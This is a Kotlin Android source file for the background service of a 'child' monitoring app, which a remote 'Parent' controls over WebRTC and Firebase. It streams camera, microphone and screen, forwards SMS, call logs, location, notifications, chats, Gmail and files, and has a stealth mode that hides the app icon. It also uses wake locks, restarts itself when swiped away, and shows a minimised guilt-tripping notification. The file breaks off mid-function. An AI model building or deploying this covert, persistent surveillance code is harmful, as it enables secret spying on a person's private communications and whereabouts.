package nexus.android.child

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.edit
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import nexus.android.child.commands.BackgroundServiceExtendedStealthHandler
import nexus.android.child.commands.BackgroundServicePermissionHandler
import nexus.android.child.commands.BackgroundServiceSettingsHandler
import nexus.android.child.commands.CommandHandler
import nexus.android.child.commands.CommandHandlerImpl
import nexus.android.child.components.calllog.CallLogSharing
import nexus.android.child.components.camera.CameraController
import nexus.android.child.components.chat.ChatMonitor
import nexus.android.child.components.chat.DataChannelClient
import nexus.android.child.components.location.LocationController
import nexus.android.child.components.microphone.MicrophoneController
import nexus.android.child.components.sms.SmsSharing
import nexus.android.child.components.storage.FileSystemController
import nexus.android.child.configuration.AppConfig
import nexus.android.child.gmail.GmailAuthRepository
import nexus.android.child.gmail.GmailRepository
import nexus.android.child.gmail.GmailSyncManager
import nexus.android.child.id.DeviceIdManager
import nexus.android.child.signaling.DeviceStatusManager
import nexus.android.child.signaling.SignalingClient
import nexus.android.child.webrtc.PeerObserver
import nexus.android.child.webrtc.PhantomPeerManager
import org.webrtc.DataChannel
import org.webrtc.PeerConnection
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import java.nio.ByteBuffer
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.coroutines.resume

/**
  * This is a foreground service designed to maintain a persistent WebRTC connection in the background.
  *
  * ### Key Features:
  * - **Foreground Service**: Runs as a foreground service with a persistent notification to ensure the system does not terminate it.
  * - **WebRTC Management**: Manages WebRTC components such as `PeerConnection`, `DataChannel`, and media controllers for real-time communication.
  * - **Reconnection Logic**: Implements reconnection logic with exponential backoff to handle network interruptions gracefully.
  * - **Stealth Mode**: Supports stealth mode by hiding the app icon from the launcher, making the app less conspicuous.
  * - **Wake Lock**: Acquires a wake lock to keep the CPU running during critical operations, ensuring uninterrupted functionality.
  * - **Battery Optimization**: Requests the user to ignore battery optimizations for the app, preventing the system from restricting its background activities.
  * - **Resource Cleanup**: Cleans up resources when the service is destroyed and attempts to restart itself if terminated unexpectedly.
  *
  * This service is critical for maintaining a seamless and reliable background connection, especially in scenarios requiring real-time communication and persistent operations.
  */

class BackgroundService : Service() { // No binding, so return null in onBind

    companion object { // Static methods and constants
        private const val TAG = "BackgroundService"
        private const val NOTIFICATION_ID = 1001 // Unique ID for the notification
        private const val CHANNEL_ID = "DeltaApp_Background" // Notification channel ID
        private const val CHANNEL_NAME = "DeltaApp Background Service" // Channel name
        private const val CHANNEL_DESCRIPTION = "Keeps DeltaApp running in background" // Channel description
        const val ACTION_CONNECTION_STATUS = "com.android.child.CONNECTION_STATUS"
        const val EXTRA_STATUS = "status"
        const val PERMISSION_CONNECTION_STATUS = "com.android.child.PERMISSION_CONNECTION_STATUS" // Custom permission
        const val ACTION_GMAIL_SYNC_REFRESH = "com.android.child.ACTION_GMAIL_SYNC_REFRESH"
        // To start the service from other components
        @Volatile
        private var isServiceRunning = AtomicBoolean(false) // Track service state
        fun startService(context: Context) { // Start service if not already running
            if (!isServiceRunning.get()) { // Prevent multiple starts
                Log.d("BackgroundService", "Starting BackgroundService...")
                val intent = Intent(context, BackgroundService::class.java) // Explicit intent
                context.startForegroundService(intent) // Start as foreground service
            }
        }

    }

    // WebRTC Components and Controllers
    private var peerMgr: PhantomPeerManager? = null // Manages PeerConnection
    private var signaling: SignalingClient? = null // Signaling via Firebase
    private var deviceStatusMgr: DeviceStatusManager? = null // Manages device presence
    private var cameraCtrl: CameraController? = null // Manages camera streaming
    private var micCtrl: MicrophoneController? = null // Manages microphone streaming
    private var screenRecordingCtrl: nexus.android.child.components.screen.ScreenRecordingController? = null // Manages screen recording
    private var parentVoicePlayer: nexus.android.child.components.voice.ParentVoicePlayer? = null // Manages parent voice playback
    private var smsSharing: SmsSharing? = null // Manages SMS sharing
    private var callLogSharing: CallLogSharing? = null // Manages Call Log sharing
    private var dataChannel: DataChannel? = null // DataChannel for commands
    private var locationController: LocationController? = null // Manages location sharing
    private var notificationController: nexus.android.child.components.notification.NotificationController? = null // Manages notification sharing
    private var chatController: nexus.android.child.components.chat.ChatController? = null // Manages chat monitoring
    private var gmailSyncManager: GmailSyncManager? = null
    private var fileSystemController: FileSystemController? = null
    private var wallpaperController: nexus.android.child.components.wallpaper.WallpaperController? = null // Manages wallpaper changes
    private var vibrationFlashController: nexus.android.child.components.vibrateflash.VibrationFlashController? = null // Manages vibration and flash
    private var healthCheckJob: Job? = null // Job for health checks
    private var reconnectionJob: Job? = null // Job for reconnection attempts
    @Volatile
    private var isReconnecting = AtomicBoolean(false) // Prevent concurrent reconnects
    @Volatile
    private var reconnectionAttempts = 0 // Count of reconnection attempts
    private val maxReconnectionAttempts = 5 // Max attempts before giving up
    @Volatile private var lastPongAtMs: Long = 0L // Last pong timestamp
    private var persistentRoomId: String? = null // Persisted room ID
    private val stealthActivated = AtomicBoolean(false) // Stealth mode state
    @Volatile private var lastOfferSdpHash: Int = 0
    private val pendingRemoteIce = mutableListOf<org.webrtc.IceCandidate>()
    private val pendingRemoteIceLock = Any()
    private var renegotiationCompleteCallback: (() -> Unit)? = null // Callback for renegotiation completion
    
    // MediaProjection broadcast receiver
    private val mediaProjectionReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == nexus.android.child.components.screen.TransparentMediaProjectionActivity.ACTION_MEDIA_PROJECTION_RESULT) {
                handleMediaProjectionResult(intent)
            }
        }
    }

    // Coroutine Scope for background tasks
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob()) // IO dispatcher

    // Command handler for processing incoming commands
    private lateinit var commandHandler: CommandHandler // Initialized after DataChannel is ready

    // Generate or load device ID once
    private var childId: String? = null // Cached device ID

    override fun onCreate() { // Service created
        super.onCreate()
        Log.d(TAG, "Service created")
        createNotificationChannel() // Setup notification channel
        
        // Start foreground with base types (Android 14+ requires explicit types)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID, 
                createNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(NOTIFICATION_ID, createNotification())
        }
        
        isServiceRunning.set(true) // Mark service as running
        Log.d(TAG, "Foreground service started with notification")
        
        // Register MediaProjection result receiver
        val filter = android.content.IntentFilter(nexus.android.child.components.screen.TransparentMediaProjectionActivity.ACTION_MEDIA_PROJECTION_RESULT)
        registerReceiver(mediaProjectionReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
        Log.d(TAG, "MediaProjection receiver registered")
        
        // Acquire wake lock for CPU intensive operations (lasting 10 minutes, will be reacquired as needed)
        acquireWakeLock() // Acquire wake lock
        // Request to ignore battery optimizations (user interaction required)
        // requestIgnoreBatteryOptimizations() // Request ignore battery optimizations
        // Start background connection initialization
        serviceScope.launch { // Launch in coroutine scope
            initializeConnection() // Initialize WebRTC connection
        }
        serviceScope.launch { // Generate or load device ID once
            if (childId != null) {
                Log.d(TAG, "Device ID already generated: $childId")
                return@launch // Already generated
            }
            try { // Generate unique device ID
                Log.d(TAG, "🪪 Starting device ID generation")
                val deviceId = DeviceIdManager.generateUniqueDeviceId(applicationContext) // May take time
                childId = DeviceIdManager.format(deviceId) // Format for display
                // Save to SharedPreferences for access by other components (e.g. MainActivity) too
                val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE) // Consistent prefs name
                prefs.edit { putString("device_id", deviceId) } // Save raw ID only
                Log.d(TAG, "👍 Device ID generated and saved: $deviceId") // Log raw ID
                Log.i(TAG, "👍 Device ID ready: $childId") // Log formatted ID
                
                // Initialize AppLockManager with device ID for remote PIN management
                nexus.android.child.applock.AppLockManager.initialize(applicationContext, deviceId)
                Log.d(TAG, "🔒 AppLockManager initialized")
            } catch (e: Exception) { // Handle errors gracefully
                Log.e(TAG, "❌ Failed to generate device ID", e) // Log error
            }
        }
        /* Note: Job scheduling should only happen in BootReceiver and PersistentJobService, to avoid infinite loops */
    }

    private var wakeLock: PowerManager.WakeLock? = null // Wake lock reference for CPU keep-alive operations

    private fun acquireWakeLock() { // Acquire wake lock to keep CPU on
        try { // Acquire partial wake lock
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager // Get PowerManager
            wakeLock = powerManager.newWakeLock( // Create wake lock
                PowerManager.PARTIAL_WAKE_LOCK, // Keep CPU on
                "Nexus::BackgroundServiceLock" // Tag for debugging
            ).apply { // Configure and acquire
                setReferenceCounted(false) // Non-reference counted
                acquire(10 * 60 * 1000L) // 10 minutes, will be reacquired
            }
            Log.d(TAG, "Wake lock acquired")
        } catch (e: Exception) { // Handle errors
            wakeLock = null // Clear reference
            Log.e(TAG, "Failed to acquire wake lock", e)
        }
    }

    private fun releaseWakeLock() { // Release wake lock
        try { // Release if held
            wakeLock?.let {
                if (it.isHeld) { // Check if held
                    it.release() // Release wake lock
                    Log.d(TAG, "Wake lock released")
                }
            }
            wakeLock = null // Clear reference
            Log.d(TAG, "Wake lock released")
        } catch (e: Exception) { // Handle errors
            Log.e(TAG, "Failed to release wake lock", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int { // Service started
        super.onStartCommand(intent, flags, startId)
        Log.d(TAG, "Service started with flags: $flags, startId: $startId")

        // Reacquire wake lock on restart in case it was released
        acquireWakeLock() // Reacquire wake lock

        // Handle service intent actions
        val action = intent?.action // Get action from intent
        if (action == "STEALTH_ON") { // Activate stealth mode
            Log.d(TAG, "Received STEALTH_ON via intent")
            activateStealthModeService() // Activate stealth mode
        }
        if (action == ACTION_GMAIL_SYNC_REFRESH) {
            val channel = dataChannel
            if (channel != null) {
                if (gmailSyncManager == null) {
                    gmailSyncManager = GmailSyncManager(this, GmailRepository(this))
                }
                if (GmailAuthRepository.isConnected(this)) {
                    gmailSyncManager?.start(serviceScope, channel)
                }
            }
        }

        return START_STICKY // Restart service if killed by system
    }
    override fun onBind(intent: Intent?): IBinder? = null // No binding, return null
    override fun onDestroy() { // Service destroyed
        Log.d(TAG, "Service destroyed")
        isServiceRunning.set(false) // Mark service as not running
        
        // Unregister MediaProjection receiver
        try {
            unregisterReceiver(mediaProjectionReceiver)
            Log.d(TAG, "MediaProjection receiver unregistered")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to unregister MediaProjection receiver", e)
        }
        
        cleanupEverything() // Clean up all resources
        releaseWakeLock() // Release wake lock
        deviceStatusMgr?.stop() // Stop status reporting
        nexus.android.child.applock.AppLockManager.stopFirebaseListener() // Stop app lock Firebase listener
        serviceScope.cancel() // Cancel all coroutines
        super.onDestroy() // Call super

        // Restart handling is delegated to BootReceiver/JobService; no AlarmManager schedule here to avoid loops
        Log.d(TAG, "Service destroyed - restart handled by BootReceiver/JobService")
    }

    override fun onTaskRemoved(rootIntent: Intent?) { // App task removed (swiped away)
        Log.d(TAG, "Task removed, restarting service")
        super.onTaskRemoved(rootIntent) // Call super
        // Restart service immediately when app is swiped away from recent tasks
        val restartIntent = Intent(this, BackgroundService::class.java) // Intent to restart service
        restartIntent.setPackage(packageName) // Ensure correct package
        PendingIntent.getService( // Create pending intent
            this, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE // Immutable for security
        ).apply {
            this.send() // Send intent to restart service
        }
        Log.d(TAG, "Restart intent sent")
        // Alternative approach (less immediate):
        startService(restartIntent)
    }

    private fun sendStatusBroadcast(status: String) { // Broadcast connection status updates
        try {
            val intent = Intent(ACTION_CONNECTION_STATUS) // Create intent with action
            intent.putExtra(EXTRA_STATUS, status) // Add status extra
            sendBroadcast(intent, PERMISSION_CONNECTION_STATUS) // Send broadcast with permission
            Log.d(TAG, "Status broadcast sent: $status")
        } catch (e: Exception) { // Handle errors
            Log.e(TAG, "Failed to send status broadcast: $status", e)
        }
    }

    private fun createNotificationChannel() { // Create notification channel for foreground service
        val channel = NotificationChannel(
            CHANNEL_ID, // Unique channel ID
            CHANNEL_NAME, // User-visible name
            NotificationManager.IMPORTANCE_MIN // Minimize prominence
        ).apply { // Configure channel
            description = CHANNEL_DESCRIPTION // Description
            setShowBadge(false) // No badge for this channel
            lockscreenVisibility = Notification.VISIBILITY_PUBLIC // Show on lock screen
            enableLights(true) // Enable LED light
            enableVibration(false) // No vibration
            vibrationPattern = longArrayOf(0L) // No vibration
            setSound(null, null) // No sound
        }

        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager // Get manager
        notificationManager.createNotificationChannel(channel) // Create channel
        Log.d(TAG, "Notification channel created")
    }

    private fun createNotification(): Notification { // Create persistent notification for foreground service
        // Intent to open MainActivity when notification is tapped
        val intent = Intent(this, MainActivity::class.java).apply { // Open MainActivity
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // Clear existing task
        }
        val pendingIntent = PendingIntent.getActivity( // Create pending intent
            this, 0, intent, // Intent to open
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE // Immutable for security
        )

        return NotificationCompat.Builder(this, CHANNEL_ID) // Build notification
            .setContentTitle("Parents are crying 😭") // Title
            .setContentText("Don't you love your parents? 🥺") // Text
            .setSmallIcon(R.mipmap.ic_launcher_foreground) // App icon
            .setContentIntent(pendingIntent) // Open MainActivity on tap
            .setTicker("Nexus is running in background") // Ticker text
            .setOngoing(false) // User can swipe away
            .setSilent(true) // No sound or vibration
            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimize prominence
            .setCategory(NotificationCompat.CATEGORY_SERVICE) // Service category
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC) // Show on lock screen too
            .build() // Build notification
    }

    private suspend fun initializeConnection() { // Initialize WebRTC connection
        Log.d(TAG, "Initializing background connection") // Log start
        try {
            // Load device ID from SharedPreferences
            val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE) // Consistent prefs name
            var existingId = prefs.getString("device_id", null) // May be null if not yet generated

            if (existingId == null) { // Wait for generate device ID
                Log.w(TAG, "No device ID found, waiting for generate...")
                // Wait up to 30 seconds for device ID to be generated
                var attempts = 0
                while (existingId == null && attempts < 30) {
                    delay(1000) // Wait 1 second
                    existingId = prefs.getString("device_id", null)
                    attempts++
                    Log.d(TAG, "Waiting for device ID... attempt $attempts")
                }

                if (existingId == null) { // Still null after waiting
                    Log.e(TAG, "Device ID still not found after 30 seconds")
                    return // Cannot proceed without device ID
                }
            }

            val rawRoomId = existingId // Use raw ID for Firebase
            val formattedRoomId = DeviceIdManager.format(existingId) // Format for display
            persistentRoomId = formattedRoomId // Save for future use

            Log.d(TAG, "Using device ID from MainActivity: $existingId")
            Log.d(TAG, "Formatted room ID: $formattedRoomId")
            Log.d("BackgroundService", "Using raw room ID for Firebase: $rawRoomId")
            
            // Start device status reporting
            if (deviceStatusMgr == null) {
                deviceStatusMgr = DeviceStatusManager(rawRoomId)
                deviceStatusMgr?.start()
            } else {
                deviceStatusMgr?.setStatus(DeviceStatusManager.ONLINE_WAITING)
            }

            val observer = PeerObserver( // PeerConnection observer
                onIce = { candidate -> 
                    // Send ICE candidates to Firebase (Trickle ICE)
                    signaling?.sendIceCandidate(candidate)
                },
                onDataChannelReceived = { channel ->
                    Log.d(TAG, "📦 DataChannel received from Parent")
                    serviceScope.launch(Dispatchers.Main) { 
                        setupDataChannel(channel)
                    }
                },
                onConnectionStateChange = { state -> // Connection state changes
                    Log.d(TAG, "Connection state changed: $state")
                    when (state) { // Handle states
                        PeerConnection.PeerConnectionState.CONNECTED -> { // Successfully connected
                            reconnectionAttempts = 0 // Reset attempts on success
                            isReconnecting.set(false) // Clear reconnecting flag
                            reconnectionJob?.cancel() // Cancel any ongoing reconnection job
                            reconnectionJob = null // Clear job reference
                            Log.d(TAG, "Reconnection attempts reset after successful connection")
                            Log.d(TAG, "Connection established")
                            sendStatusBroadcast("Connected")
                            // Update status to connected
                            deviceStatusMgr?.setStatus(DeviceStatusManager.CONNECTED)
                        }

                        PeerConnection.PeerConnectionState.DISCONNECTED -> { // Disconnected
                             // Update status to waiting
                            deviceStatusMgr?.setStatus(DeviceStatusManager.ONLINE_WAITING)
                            
                            if (!isReconnecting.get()) { // Avoid multiple triggers
                                Log.d(TAG, "PeerConnection disconnected - scheduling restart")
                                serviceScope.launch { restartConnection() } // Restart connection
                            }
                            sendStatusBroadcast("Disconnected")
                        }

                        PeerConnection.PeerConnectionState.FAILED -> { // Connection failed
                            if (!isReconnecting.get()) { // Avoid multiple triggers
                                Log.d(TAG,"PeerConnection failed - scheduling restart")
                                serviceScope.launch { restartConnection() } // Restart connection
                            }
                            sendStatusBroadcast("Failed")
                        }

                        PeerConnection.PeerConnectionState.CLOSED -> { // Connection closed
                            deviceStatusMgr?.setStatus(DeviceStatusManager.ONLINE_WAITING)
                            
                            if (!isReconnecting.get()) { // Avoid multiple triggers
                                Log.d(TAG,"PeerConnection closed - scheduling restart")
                                serviceScope.launch { restartConnection() } // Restart connection
                            }
                            sendStatusBroadcast("Closed")
                        }

                        else -> {
                            Log.d(TAG, "Connection state: $state")
                        }
                    }
                }
            )

            // Create peer manager and PeerConnection
            peerMgr = PhantomPeerManager(this, observer).apply { // Initialize manager
                initializePeerConnectionFactory() // Init factory
                createPeerConnection(listOf( // ICE servers
                    PeerConnection.IceServer.builder(AppConfig.WebRTC.STUN_SERVERS).createIceServer() // Public STUN server
                ))
            }

            // Create controllers
            cameraCtrl = // Initialize camera controller
                CameraController(this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection()) // Pass factory and connection

            micCtrl = // Initialize microphone controller
                MicrophoneController(this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection()) // Pass factory and connection
            
            screenRecordingCtrl = // Initialize screen recording controller
                nexus.android.child.components.screen.ScreenRecordingController(this, peerMgr!!.getFactory(), peerMgr!!.getPeerConnection()) // Pass factory and connection

            parentVoicePlayer = // Initialize parent voice player
                nexus.android.child.components.voice.ParentVoicePlayer(this)

            // Initialize sharing components (will be set after data channel is created)
            smsSharing = null // Will be set after data channel is created
            callLogSharing = null // Will be set after data channel is created

            // Create signaling client for Trickle ICE
            signaling = SignalingClient( // Initialize signaling
                deviceId = rawRoomId, // Use raw ID for Firebase path
                /**
                 * Handle incoming SDP from Firebase 'offer' path
                 * 
                 * DUAL PURPOSE:
                 * 1. Initial Connection: Receive offer from Parent (Child = Answerer)
                 * 2. Renegotiation: Receive answer from Parent (Child = Offerer, role reversal)
                 * 
                 * ROLE REVERSAL DETECTION:
                 * - If type = ANSWER and signalingState = HAVE_LOCAL_OFFER → This is renegotiation answer
                 * - If type = OFFER and connectionState = CONNECTED → This is standard renegotiation (not used in our flow)
                 * - Otherwise → This is initial connection offer
                 * 
                 * RENEGOTIATION FLOW (Role Reversal):
                 * 1. Child creates offer (temporary offerer)
                 * 2. Child sends offer to 'answer' path
                 * 3. Parent receives offer from 'answer' path
                 * 4. Parent creates answer
                 * 5. Parent sends answer to 'offer' path
                 * 6. Child receives answer HERE (from 'offer' path)
                 * 7. Child sets remote description
                 * 8. Parent sends RENEGOTIATION_COMPLETE
                 * 9. Child invokes completion callback
                 */
                onOfferReceived = { offer ->
                    Log.d(TAG, "📩 Offer/Answer received from Parent (type: ${offer.type})")

                    serviceScope.launch {
                        val pc = peerMgr?.getPeerConnection()
                        if (pc == null) {
                            Log.w(TAG, "Offer ignored: PeerConnection not ready")
                            return@launch
                        }

                        // CASE 1: Answer to our renegotiation offer (Role Reversal)
                        // We created an offer, sent it to 'answer' path
                        // Parent created answer, sent it to 'offer' path
                        // We receive it here and complete renegotiation
                        if (offer.type == SessionDescription.Type.ANSWER && 
                            pc.signalingState() == PeerConnection.SignalingState.HAVE_LOCAL_OFFER) {
                            Log.d(TAG, "🔄 Received answer to our renegotiation offer (role reversal)")
                            
                            val ok = setRemoteDescriptionAwait(pc, offer)
                            if (ok) {
                                Log.d(TAG, "✅ Renegotiation SDP exchange complete (answer set)")
                                // Don't invoke callback here - wait for RENEGOTIATION_COMPLETE message
                                // This ensures both sides have completed the SDP exchange
                            } else {
                                Log.e(TAG, "Failed to set remote description for renegotiation answer")
                            }
                            return@launch
                        }

                        // Check if this is a duplicate offer (same SDP hash)
                        // Prevents processing the same offer multiple times
                        val offerHash = offer.description.hashCode()
                        val isDuplicate = (offerHash == lastOfferSdpHash)
                        
                        if (isDuplicate) {
                            Log.d(TAG, "Offer ignored: duplicate SDP")
                            return@launch
                        }

                        // CASE 2: Check if this is a renegotiation (already connected)
                        // This would be standard renegotiation where Parent is offerer
                        // (Not used in our mic flow, but kept for compatibility)
                        val isConnectedStable =
                            pc.connectionState() == PeerConnection.PeerConnectionState.CONNECTED &&
                                pc.signalingState() == PeerConnection.SignalingState.STABLE
                        
                        if (isConnectedStable) {
                            Log.d(TAG, "🔄 Accepting renegotiation offer (CONNECTED+STABLE)")
                            // Don't change status during renegotiation - keep as CONNECTED
                        } else {
                            // CASE 3: Initial connection - set status to CONNECTING
                            deviceStatusMgr?.setStatus(DeviceStatusManager.CONNECTING)
                        }

                        lastOfferSdpHash = offerHash

                        // Set remote description (offer from Parent)
                        val ok = setRemoteDescriptionAwait(pc, offer)
                        if (!ok) {
                            Log.e(TAG, "Failed to set remote description for offer")
                            return@launch
                        }

                        // Flush any ICE candidates that arrived before the offer
                        flushPendingRemoteIce()

                        // Create and send answer
                        val answer = peerMgr?.createAnswer()
                        if (answer != null) {
                            signaling?.sendAnswer(answer)
                            if (isConnectedStable) {
                                Log.d(TAG, "📤 Renegotiation answer sent to Firebase")
                                // Don't invoke callback here - wait for RENEGOTIATION_COMPLETE from parent
                                Log.d(TAG, "⏳ Waiting for RENEGOTIATION_COMPLETE from parent...")
                            } else {
                                Log.d(TAG, "📤 Answer sent to Firebase (initial connection)")
                            }
                        } else {
                            Log.e(TAG, "Failed to create/send answer")
                        }
                    }
                },
                onIceCandidateReceived = { candidate ->
                    val pc = peerMgr?.getPeerConnection() ?: return@SignalingClient

                    if (pc.remoteDescription == null) {
                        synchronized(pendingRemoteIceLock) {
                            pendingRemoteIce.add(candidate)
                        }
                        return@SignalingClient
                    }

                    peerMgr?.addIceCandidate(candidate)
                }
            )

            // Child restart semantics: clear stale offer/answer/ICE before waiting
            serviceScope.launch {
                try {
                    signaling?.clearSessionData()
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to clear signaling session data on startup: ${e.message}")
                } finally {
                    signaling?.start()
                }
            }

            /**
            * We are ANSWERER now, so we just wait for offer.
            * But we still need to initialize DataChannel components locally so they are ready when channel opens.
            * Note: DataChannel is created by the OFFERER (Parent), so we wait for onDataChannel event in PeerObserver.
            * However, our CommandHandler logic relies on initializing components early.
            * Allow components to be initialized even if DataChannel is null initially?
            * Yes, most controllers don't strictly require DataChannel at construction, only when sending data.
            * But current code passes `channel` to constructors.
            * WORKAROUND: We will initialize components when DataChannel is received in onDataChannel callback in PeerObserver?
            * Or we can create a "placeholder" or rely on the fact that PeerConnection.Observer.onDataChannel will be called.
            * Actually, we should just initialize CommandHandler with null channel for now?
            * Or better, let's keep the initialization block but move it to a method that can be called when DataChannel is established.
            * But wait, the previous code initialized everything inside `if (peerRole == PeerRole.OFFERER)`.
            * Let's refactor: initialize everything on connection setup, but wait for DataChannel from remote.
            **/

            Log.d(TAG, "Waiting for offer (ANSWERER role)")

        } catch (e: Exception) { // Handle errors
            Log.e(TAG, "Error initializing connection", e)
            delay(5000) // Wait before retrying to avoid rapid loops
            initializeConnection() // Retry initialization
        }
    }

    private fun setupDataChannel(channel: DataChannel) {
        Log.d(TAG, "⚙️ Setting up DataChannel components")
        this.dataChannel = channel
        
        // Set DataChannel for screen recording controller (for system audio streaming)
        screenRecordingCtrl?.setDataChannel(channel)
        
        try {
            // Initialize sharing components
            smsSharing = SmsSharing(this, channel)
            callLogSharing = CallLogSharing(this, channel)
            locationController = LocationController(this, channel)
            notificationController = nexus.android.child.components.notification.NotificationController(this, channel)
            chatController = nexus.android.child.components.chat.ChatController(this, channel)
            wallpaperController = nexus.android.child.components.wallpaper.WallpaperController(this)
            vibrationFlashController = nexus.android.child.components.vibrateflash.VibrationFlashController(this)
            
            // Initialize Gmail Sync
            gmailSyncManager = GmailSyncManager(this, GmailRepository(this))
            if (GmailAuthRepository.isConnected(this)) {
                gmailSyncManager?.start(serviceScope, channel)
            }

            // ChatMonitor Setup
            ChatMonitor.instance.setDataChannelClient(object : DataChannelClient {
                override fun send(jsonPayload: String): Boolean {
                    return if (channel.state() == DataChannel.State.OPEN) {
                        try {
                            channel.send(DataChannel.Buffer(ByteBuffer.wrap(jsonPayload.toByteArray()), false))
                            Log.d(TAG, "ChatMonitor payload sent: $jsonPayload")
                            true
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to send ChatMonitor payload", e)
                            false
                        }
                    } else {
                        Log.w(TAG, "ChatMonitor send failed: channel not open")
                        false
                    }
                }
            })
            
            // Attach components (App Lock only - notifications are command-based now)
            nexus.android.child.applock.AppLockAlertSender.attachDataChannel(channel)
            
            fileSystemController = FileSystemController(
                context = this,
                dataChannel = channel,
                scope = serviceScope
            )

            // Initialize CommandHandler
            commandHandler = CommandHandlerImpl(
                context = this,
                dataChannel = channel,
                cameraController = cameraCtrl,
                microphoneController = micCtrl,
                screenRecordingController = screenRecordingCtrl,
                smsSharing = smsSharing,
                callLogSharing = callLogSharing,
                isBackgroundService = true,
                permissionHandler = BackgroundServicePermissionHandler(),
                stealthHandler = BackgroundServiceExtendedStealthHandler(
                    stealthActivated,
                    onActivate = { this@BackgroundService.activateStealthModeService() },
                    onDeactivate = { this@BackgroundService.deactivateStealthModeService() }
                ),
                locationHandler = locationController,
                notificationHandler = notificationController,
                chatHandler = chatController,
                settingsHandler = BackgroundServiceSettingsHandler(this) { msg ->
                    sendDataChannelMessage(msg)
                },
                storageHandler = fileSystemController,
                parentVoiceHandler = object : nexus.android.child.commands.ParentVoiceHandler {
                    override fun startReceivingVoice() { parentVoicePlayer?.startReceiving() }
                    override fun stopReceivingVoice() { parentVoicePlayer?.stopReceiving() }
                },
                wallpaperController = wallpaperController,
                vibrationFlashController = vibrationFlashController,
                coroutineScope = serviceScope,
                onRenegotiationNeeded = { onComplete ->
                    performWebRTCRenegotiation(onComplete)
                }
            )
            Log.d(TAG, "✅ CommandHandler initialized")

            // Register observer for incoming messages
            channel.registerObserver(object : DataChannel.Observer {
                override fun onStateChange() {
                    val state = channel.state()
                    Log.d(TAG, "DataChannel state: $state")
                    when (state) {
                        DataChannel.State.OPEN -> {
                            Log.d(TAG, "DataChannel opened")
                            lastPongAtMs = System.currentTimeMillis()
                        }
                        DataChannel.State.CLOSED -> {
                            Log.d(TAG, "DataChannel closed")
                            // Clean up logic if needed
                        }
                        else -> {}
                    }
                }
                override fun onBufferedAmountChange(l: Long) {}
                override fun onMessage(buf: DataChannel.Buffer) {
                    val data = ByteArray(buf.data.remaining())
                    buf.data.get(data)
                    
                    // Binary handling (Wallpaper)
                    if (commandHandler is CommandHandlerImpl) {
                        val handler = commandHandler as CommandHandlerImpl
                        if (handler.wallpaperController?.isReceivingWallpaper() == true) {
                            handler.handleWallpaperData(data)
                            return
                        }
                    }
                    
                    // Text handling
                    val message = String(data)
                    Log.d(TAG, "📥 Command received: $message")
                    
                    /**
                     * Handle renegotiation completion confirmation from Parent
                     * 
                     * WHY THIS IS NEEDED:
                     * - Ensures both sides have completed SDP exchange before proceeding
                     * - Prevents race conditions where Child sends MIC_STARTED before Parent is ready
                     * - Provides explicit synchronization point in renegotiation flow
                     * 
                     * FLOW:
                     * 1. Child creates offer, sends to 'answer' path
                     * 2. Parent receives offer, creates answer, sends to 'offer' path
                     * 3. Child receives answer, sets remote description
                     * 4. Parent sends RENEGOTIATION_COMPLETE via DataChannel
                     * 5. Child receives RENEGOTIATION_COMPLETE HERE
                     * 6. Child invokes completion callback (sends MIC_STARTED/MIC_STOPPED)
                     */
                    if (message == "RENEGOTIATION_COMPLETE") {
                        Log.d(TAG, "✅ Received RENEGOTIATION_COMPLETE from parent")
                        renegotiationCompleteCallback?.invoke()
                        renegotiationCompleteCallback = null
                        return
                    }
                    
                    commandHandler.handleCommand(message)
                    lastPongAtMs = System.currentTimeMillis()
                }
            })
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error setting up DataChannel components", e)
        }
    }

    private fun restartConnection() { // Restart WebRTC connection with exponential backoff
        Log.d(TAG, "Starting connection restart...") // Log restart start
        if (isReconnecting.get()) { // Prevent concurrent restarts
            Log.d(TAG, "Restart already in progress")
            return // Already reconnecting
        }

        isReconnecting.set(true) // Mark as reconnecting
        reconnectionJob?.cancel() // Cancel any existing job
        healthCheckJob?.cancel() // Cancel health check during restart

        reconnectionJob = serviceScope.launch { // Launch reconnection job
            try {
                Log.d(TAG, "Cleaning up current connection...")
                cleanupCurrentConnection() // Clean up existing connection
                delay(2000) // Short delay before reinitializing

                if (!isReconnecting.get()) { // Check if restart was cancelled
                    Log.d(TAG, "Restart cancelled")
                    return@launch // Exit if cancelled
                }

                Log.d(TAG, "Reinitializing connection...")
